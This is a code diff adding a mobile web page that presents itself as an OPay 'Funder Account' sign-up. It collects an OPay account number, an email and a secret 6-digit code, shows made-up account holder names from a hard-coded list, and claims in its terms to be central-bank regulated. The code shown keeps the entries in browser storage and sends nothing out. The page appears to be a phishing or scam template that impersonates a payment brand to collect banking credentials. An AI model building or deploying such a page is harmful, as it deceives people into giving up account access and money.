@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <title>OPay - Create Account</title>
+    
+    <!-- Bootstrap 5 CSS + Icons + Google Fonts -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 16px 20px 40px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Main Container - NO CARD */
+        .create-container {
+            max-width: 420px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* Back Button - Small elegant */
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: #f0f2f5;
+            border-radius: 50%;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            margin-bottom: 20px;
+        }
+
+        .back-btn i {
+            font-size: 16px;
+            color: #00B875;
+        }
+
+        .back-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Create Account Title - Small elegant */
+        .create-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #00B875;
+            margin-bottom: 24px;
+            letter-spacing: -0.3px;
+        }
+
+        /* Logo */
+        .logo-center {
+            text-align: center;
+            margin: 10px 0 24px;
+        }
+
+        .logo-center img {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
+        }
+
+        /* Description - Simple text */
+        .desc-text {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.45;
+            margin-bottom: 12px;
+            font-weight: 400;
+            text-align:center;
+        }
+
+        .desc-text strong {
+            color: #00B875;
+            font-weight: 600;
+        }
+
+        /* Marquee - Minimal */
+        .marquee-wrapper {
+            background: #fef8e7;
+            padding: 8px 12px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        marquee {
+            font-size: 11px;
+            color: #e67e22;
+            font-weight: 500;
+        }
+
+        /* Form Labels - Small */
+        .form-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: #888;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .form-label i {
+            font-size: 12px;
+            color: #bbb;
+        }
+
+        /* Phone Input Group - Slim */
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            border: 1px solid #e0e4e8;
+            border-radius: 12px;
+            background: white;
+            transition: all 0.2s;
+        }
+
+        .phone-wrapper:focus-within {
+            border-color: #00B875;
+        }
+
+        .flag-area {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 0 12px;
+            border-right: 1px solid #e0e4e8;
+        }
+
+        .flag-area img {
+            width: 22px;
+            height: 16px;
+            object-fit: cover;
+        }
+
+        .flag-area span {
+            font-size: 13px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .phone-input {
+            flex: 1;
+            border: none;
+            padding: 12px 12px;
+            font-size: 14px;
+            background: transparent;
+            border-radius: 12px;
+        }
+
+        .phone-input:focus {
+            outline: none;
+        }
+
+        /* Name Display - Minimal */
+        .name-display {
+            background: #f6fef9;
+            border-radius: 10px;
+            padding: 10px 14px;
+            margin: 12px 0;
+            font-size: 12px;
+            color: #555;
+            border-left: 3px solid #00B875;
+        }
+
+        .name-display i {
+            color: #00B875;
+            font-size: 12px;
+            margin-right: 6px;
+        }
+
+        .name-value {
+            font-weight: 600;
+            color: #00B875;
+            font-size: 13px;
+        }
+
+        /* Regular Inputs */
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #e0e4e8;
+            border-radius: 12px;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #00B875;
+        }
+
+        /* Sign Up Button - Clean */
+        .signup-btn {
+            background: #00B875;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 30px;
+            width: 100%;
+            margin: 20px 0 12px;
+            transition: all 0.2s;
+        }
+
+        .signup-btn:active {
+            transform: scale(0.98);
+            background: #00a066;
+        }
+
+        /* Terms Section */
+        .terms-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 12px 0;
+        }
+
+        .terms-checkbox {
+            width: 16px;
+            height: 16px;
+            accent-color: #00B875;
+            margin: 0;
+        }
+
+        .terms-text {
+            font-size: 11px;
+            color: #999;
+        }
+
+        .terms-link {
+            color: #00B875;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Login Link */
+        .login-wrapper {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .login-text {
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .login-link {
+            color: #00B875;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 12px;
+        }
+
+        /* Spinner */
+        .spinner-sm {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            margin-right: 6px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 12px 16px 30px;
+            }
+            .create-title {
+                font-size: 18px;
+            }
+            .logo-center img {
+                width: 60px;
+                height: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="create-container">
+        <!-- Back Button -->
+        <a href="login.html" class="back-btn">
+            <i class="fas fa-chevron-left"></i>
+        </a>
+
+        
+        <!-- Logo Center -->
+        <div class="logo-center">
+            <img src="images/ppay.png" alt="OPay Logo">
+        </div>
+
+        <!-- Description -->
+        <div class="desc-text">
+            Get your <strong>OPay Funder Account</strong> here:<br>
+            <span style="font-size:8px;">We use your OPay AccNumber to create & identify your account, so enter it below.</span>
+        </div>
+
+        
+
+        <!-- Account Number -->
+        <div>
+            <div class="form-label">
+                <i class="fas fa-mobile-alt"></i> Account Number
+            </div>
+            <div class="phone-wrapper">
+                <div class="flag-area">
+                    <img src="https://flagcdn.com/ng.svg" alt="NG" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/7/79/Flag_of_Nigeria.svg'">
+                    <span>+234 |</span>
+                </div>
+                <input type="tel" class="phone-input" id="accountNumber" placeholder="8012345678" maxlength="10" inputmode="numeric">
+            </div>
+        </div>
+
+        <!-- Name Display -->
+        <div class="name-display">
+            <i class="fas fa-user"></i> Account Name: <span class="name-value" id="accountName">—</span>
+        </div>
+
+        <!-- Email -->
+        <div style="margin-top: 12px;">
+            <div class="form-label">
+                <i class="fas fa-envelope"></i> Email Address
+            </div>
+            <input type="email" class="form-input" id="emailInput" placeholder="youremail@example.com">
+        </div>
+
+        <!-- 6-Digit Code -->
+        <div style="margin-top: 12px;">
+            <div class="form-label">
+                <i class="fas fa-lock"></i> Enter 6-digit code
+            </div>
+            <input type="password" class="form-input" id="codeInput" maxlength="6" placeholder="••••••" inputmode="numeric">
+        </div>
+
+        <!-- Sign Up Button -->
+        <button class="signup-btn" id="signupBtn">
+            SIGN UP
+        </button>
+
+        <!-- Terms -->
+        <div class="terms-wrapper">
+            <input type="checkbox" class="terms-checkbox" id="termsCheckbox">
+            <label class="terms-text" for="termsCheckbox">
+                I have read and agree <a href="#" class="terms-link" id="termsLink">Terms and Conditions</a>
+            </label>
+        </div>
+
+        <!-- Login Link -->
+        <div class="login-wrapper">
+            <span class="login-text">Already have OPay Funder Account?</span><br>
+            <a href="#" class="login-link" id="loginLink">Click here to login <i class="fas fa-arrow-right"></i></a>
+        </div>
+    </div>
+
+    <script>
+        const accountNumber = document.getElementById('accountNumber');
+        const accountNameSpan = document.getElementById('accountName');
+        const emailInput = document.getElementById('emailInput');
+        const codeInput = document.getElementById('codeInput');
+        const signupBtn = document.getElementById('signupBtn');
+        const termsCheckbox = document.getElementById('termsCheckbox');
+        const loginLink = document.getElementById('loginLink');
+        const termsLink = document.getElementById('termsLink');
+
+        function getMockName(accNumber) {
+            const names = {
+                '0': 'Adebayo Ogunlesi', '1': 'Fatima Bello', '2': 'Chidi Okonkwo',
+                '3': 'Amara Eze', '4': 'Oluwaseun Adeyemi', '5': 'Ngozi Okonjo',
+                '6': 'Ibrahim Musa', '7': 'Ifeanyi Okafor', '8': 'Simi Adeleke', '9': 'Tony Elumelu'
+            };
+            return names[accNumber.slice(-1)] || 'OPay User';
+        }
+
+        function vibratePhone(duration = 100) {
+            if (window.navigator && window.navigator.vibrate) window.navigator.vibrate(duration);
+        }
+
+        accountNumber.addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '').slice(0, 10);
+            this.value = val;
+            if (val.length === 10) {
+                accountNameSpan.textContent = getMockName(val);
+                accountNameSpan.style.color = '#00B875';
+                vibratePhone(30);
+            } else if (val.length > 0 && val.length < 10) {
+                accountNameSpan.textContent = 'Enter 10 digits';
+                accountNameSpan.style.color = '#e67e22';
+                vibratePhone(60);
+            } else {
+                accountNameSpan.textContent = '—';
+                accountNameSpan.style.color = '#00B875';
+            }
+        });
+
+        codeInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '').slice(0, 6);
+            this.value = val;
+            if (val.length > 0 && val.length < 6) vibratePhone(60);
+        });
+
+        signupBtn.addEventListener('click', function() {
+            const acc = accountNumber.value;
+            const email = emailInput.value.trim();
+            const code = codeInput.value;
+            const terms = termsCheckbox.checked;
+
+            if (acc.length !== 10) {
+                alert('❌ Enter 10-digit account number');
+                vibratePhone(200);
+                accountNumber.focus();
+                return;
+            }
+            if (!email || !email.includes('@')) {
+                alert('❌ Valid email required');
+                vibratePhone(200);
+                emailInput.focus();
+                return;
+            }
+            if (code.length !== 6) {
+                alert('❌ Enter 6-digit code');
+                vibratePhone(200);
+                codeInput.focus();
+                return;
+            }
+            if (!terms) {
+                alert('❌ Accept Terms');
+                vibratePhone(200);
+                return;
+            }
+
+            this.innerHTML = '<div class="spinner-sm"></div> Creating...';
+            this.disabled = true;
+            setTimeout(() => {
+                localStorage.setItem('opayUser', JSON.stringify({ account: acc, email, code }));
+                alert('✅ Account created!');
+                window.location.href = 'login1.html';
+            }, 1200);
+        });
+
+        loginLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.location.href = 'login1.html';
+        });
+        termsLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('📜 Terms: 18+ only, one account per user, CBN regulated.');
+        });
+    </script>
+</body>
+</html>
